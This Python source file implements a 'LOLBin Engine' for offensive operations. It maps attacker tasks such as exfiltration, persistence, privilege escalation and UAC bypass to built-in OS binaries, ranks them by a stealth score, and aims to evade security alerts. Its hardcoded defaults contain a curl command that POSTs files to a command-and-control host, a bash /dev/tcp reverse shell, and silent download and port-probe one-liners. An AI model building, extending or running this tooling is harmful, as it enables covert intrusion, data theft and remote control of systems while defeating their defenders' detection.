"""LOLBin Engine — Living-off-the-Land binary resolver and technique mapper.

Maps offensive tasks to native OS binaries that are already present on target
systems, making operations indistinguishable from legitimate admin activity.
References GTFOBins (Linux) and LOLBAS (Windows).
"""

from __future__ import annotations

import os
from pathlib import Path
from typing import Any

import yaml
from pydantic import BaseModel, Field

from app.logging_config import get_logger

logger = get_logger("lolbin.engine")


class LOLBinEntry(BaseModel):
    """A single Living-off-the-Land binary entry."""
    name: str
    platform: str
    binary: str
    categories: list[str] = Field(default_factory=list)
    description: str = ""
    example_commands: list[dict[str, str]] = Field(default_factory=list)
    mitre_techniques: list[str] = Field(default_factory=list)
    stealth_rating: int = 0
    detection_notes: str = ""
    requires_root: bool = False
    common_on_servers: bool = True
    gtfobins_url: str = ""
    lolbas_url: str = ""


class LOLBinMatch(BaseModel):
    """A LOLBin recommendation for a specific task."""
    entry: LOLBinEntry
    task: str
    recommended_command: str
    explanation: str
    relevance_score: float = 0.0


class LOLBinEngine:
    """Resolves offensive tasks to native OS binaries.

    Given a task description (e.g., 'download a file', 'enumerate network'),
    finds the best LOLBin alternative that's likely to be present on the
    target system and won't trigger security alerts.
    """

    def __init__(self, registry_path: str | Path | None = None) -> None:
        self._entries: list[LOLBinEntry] = []
        self._by_name: dict[str, LOLBinEntry] = {}
        self._by_category: dict[str, list[LOLBinEntry]] = {}
        self._by_platform: dict[str, list[LOLBinEntry]] = {}

        if registry_path:
            self.load_registry(registry_path)
        else:
            self._load_builtin()

    def _load_builtin(self) -> None:
        """Load the built-in LOLBin registry."""
        builtin_path = Path(__file__).parent / "lolbin_registry.yaml"
        if builtin_path.exists():
            self.load_registry(builtin_path)
        else:
            logger.warning("Built-in LOLBin registry not found at %s, loading defaults", builtin_path)
            self._load_hardcoded_defaults()

    def load_registry(self, path: str | Path) -> int:
        """Load LOLBin entries from a YAML file."""
        path = Path(path)
        if not path.exists():
            logger.error("LOLBin registry not found: %s", path)
            return 0

        try:
            with open(path, "r", encoding="utf-8") as f:
                data = yaml.safe_load(f)
        except Exception as e:
            logger.error("Failed to load LOLBin registry: %s", e)
            return 0

        entries = data.get("lolbins", [])
        count = 0
        for entry_data in entries:
            try:
                entry = LOLBinEntry(**entry_data)
                self._register(entry)
                count += 1
            except Exception as e:
                logger.warning("Failed to load LOLBin entry: %s", e)

        logger.info("Loaded %d LOLBin entries from %s", count, path)
        return count

    def _register(self, entry: LOLBinEntry) -> None:
        """Register a LOLBin entry into indexes."""
        self._entries.append(entry)
        self._by_name[entry.name.lower()] = entry

        for cat in entry.categories:
            if cat not in self._by_category:
                self._by_category[cat] = []
            self._by_category[cat].append(entry)

        if entry.platform not in self._by_platform:
            self._by_platform[entry.platform] = []
        self._by_platform[entry.platform].append(entry)

    def resolve_task(
        self,
        task: str,
        platform: str = "linux",
        categories: list[str] | None = None,
        min_stealth: int = 0,
    ) -> list[LOLBinMatch]:
        """Find LOLBins that can accomplish a task.

        Args:
            task: Description of what to accomplish (e.g., "download file", "port scan")
            platform: Target OS ("linux", "windows", "cross-platform")
            categories: Filter by LOLBin categories
            min_stealth: Minimum stealth rating (0-100)
        """
        candidates = self._entries

        candidates = [
            e for e in candidates
            if e.platform in (platform, "cross-platform")
        ]

        if categories:
            candidates = [
                e for e in candidates
                if any(c in e.categories for c in categories)
            ]

        if min_stealth > 0:
            candidates = [e for e in candidates if e.stealth_rating >= min_stealth]

        task_lower = task.lower()
        task_keywords = set(task_lower.split())

        matches: list[LOLBinMatch] = []
        for entry in candidates:
            score = self._score_relevance(task_lower, task_keywords, entry)
            if score > 0:
                best_cmd, best_desc = self._find_best_command(task_lower, entry)

                matches.append(LOLBinMatch(
                    entry=entry,
                    task=task,
                    recommended_command=best_cmd,
                    explanation=best_desc,
                    relevance_score=score,
                ))

        matches.sort(key=lambda m: (m.relevance_score, m.entry.stealth_rating), reverse=True)
        return matches[:5]

    def _score_relevance(
        self,
        task_lower: str,
        task_keywords: set[str],
        entry: LOLBinEntry,
    ) -> float:
        """Score how relevant a LOLBin is to a task."""
        score = 0.0

        desc_lower = entry.description.lower()
        for kw in task_keywords:
            if len(kw) > 2 and kw in desc_lower:
                score += 10.0

        task_category_map = {
            "download": "download", "fetch": "download", "transfer": "download",
            "upload": "exfiltrate", "exfil": "exfiltrate", "extract": "exfiltrate",
            "scan": "recon", "enumerate": "recon", "discover": "recon", "port": "recon",
            "network": "recon", "dns": "recon", "host": "recon",
            "execute": "execute", "run": "execute", "shell": "execute", "command": "execute",
            "persist": "persist", "backdoor": "persist", "cron": "persist", "service": "persist",
            "compile": "compile", "build": "compile",
            "privilege": "privesc", "escalat": "privesc", "root": "privesc", "admin": "privesc",
            "bypass": "uac_bypass",
        }

        for keyword, category in task_category_map.items():
            if keyword in task_lower and category in entry.categories:
                score += 20.0

        for example in entry.example_commands:
            example_task = example.get("task", "").lower()
            for kw in task_keywords:
                if len(kw) > 2 and kw in example_task:
                    score += 5.0

        score += entry.stealth_rating / 10.0

        return score

    def _find_best_command(self, task_lower: str, entry: LOLBinEntry) -> tuple[str, str]:
        """Find the best matching example command for a task."""
        best_score = -1
        best_cmd = entry.binary
        best_desc = entry.description

        for example in entry.example_commands:
            example_task = example.get("task", "").lower()
            score = sum(1 for w in task_lower.split() if len(w) > 2 and w in example_task)
            if score > best_score:
                best_score = score
                best_cmd = example.get("command", entry.binary)
                best_desc = example.get("description", entry.description)

        return best_cmd, best_desc

    def get_by_name(self, name: str) -> LOLBinEntry | None:
        """Get a LOLBin entry by name."""
        return self._by_name.get(name.lower())

    def get_by_category(self, category: str) -> list[LOLBinEntry]:
        """Get all LOLBins in a category."""
        return self._by_category.get(category, [])

    def get_by_platform(self, platform: str) -> list[LOLBinEntry]:
        """Get all LOLBins for a platform."""
        return self._by_platform.get(platform, [])

    def get_all(self) -> list[LOLBinEntry]:
        """Return all registered LOLBin entries."""
        return list(self._entries)

    def get_categories(self) -> list[str]:
        """Return all available categories."""
        return sorted(self._by_category.keys())

    def get_count(self) -> int:
        """Return total LOLBin count."""
        return len(self._entries)

    def get_mitre_coverage(self) -> dict[str, list[str]]:
        """Return MITRE ATT&CK technique coverage across all LOLBins."""
        coverage: dict[str, list[str]] = {}
        for entry in self._entries:
            for technique in entry.mitre_techniques:
                if technique not in coverage:
                    coverage[technique] = []
                coverage[technique].append(entry.name)
        return coverage

    def _load_hardcoded_defaults(self) -> None:
        """Fallback: load minimal LOLBin set if YAML is missing."""
        defaults = [
            LOLBinEntry(
                name="curl", platform="cross-platform", binary="curl",
                categories=["download", "recon", "exfiltrate"],
                description="Transfer data to/from servers — universal HTTP client",
                stealth_rating=85,
                mitre_techniques=["T1105", "T1071.001"],
                example_commands=[
                    {"task": "download file", "command": "curl -s -o output.txt http://{url}", "description": "Silent file download"},
                    {"task": "port check", "command": "curl -s -o /dev/null -w '%{{http_code}}' http://{target}:{port}", "description": "HTTP port probe"},
                    {"task": "exfiltrate data", "command": "curl -X POST -d @{file} https://{c2}/upload", "description": "POST file to C2"},
                ],
            ),
            LOLBinEntry(
                name="bash_tcp", platform="linux", binary="bash",
                categories=["recon", "execute"],
                description="Bash built-in /dev/tcp for network probing",
                stealth_rating=95,
                mitre_techniques=["T1059.004", "T1046"],
                example_commands=[
                    {"task": "port scan", "command": "echo '' > /dev/tcp/{target}/{port} 2>/dev/null && echo open", "description": "Silent TCP port check"},
                    {"task": "reverse shell", "command": "bash -i >& /dev/tcp/{ip}/{port} 0>&1", "description": "Bash reverse shell"},
                ],
            ),
            LOLBinEntry(
                name="python", platform="cross-platform", binary="python3",
                categories=["execute", "download", "recon", "exfiltrate"],
                description="Python interpreter — extremely versatile LOLBin",
                stealth_rating=75,
                mitre_techniques=["T1059.006", "T1105", "T1046"],
                example_commands=[
                    {"task": "port scan", "command": "python3 -c \"import socket; s=socket.socket(); s.settimeout(1); print('open' if not s.connect_ex(('{target}',{port})) else 'closed')\"", "description": "Python socket port check"},
                    {"task": "download file", "command": "python3 -c \"import urllib.request; urllib.request.urlretrieve('{url}', '{output}')\"", "description": "Python file download"},
                    {"task": "http server", "command": "python3 -m http.server {port}", "description": "Quick HTTP server for file transfer"},
                ],
            ),
        ]
        for entry in defaults:
            self._register(entry)
        logger.info("Loaded %d hardcoded default LOLBin entries", len(defaults))
